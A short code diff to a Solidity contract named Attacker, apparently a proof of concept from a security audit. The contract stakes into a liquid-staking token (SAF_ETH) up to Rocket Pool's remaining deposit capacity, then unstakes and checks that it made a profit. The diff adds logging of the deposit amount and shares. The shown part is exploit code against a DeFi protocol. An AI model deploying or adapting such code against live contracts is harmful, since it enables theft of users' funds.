@@ -36,7 +36,10 @@ contract Attacker {
       .getMaximumDepositPoolSize() - rocketDepositPool.getBalance());
 
     SAF_ETH.stake{ value: depositAmount }();
-    SAF_ETH.unstake(SAF_ETH.balanceOf(address(this)));
+    uint256 shares = SAF_ETH.balanceOf(address(this));
+    console.log("attacker deposit amount", depositAmount);
+    console.log("attacker share", shares);
+    SAF_ETH.unstake(shares);
     balance = address(this).balance;
     require(balance > msg.value, "!profitable");
   }
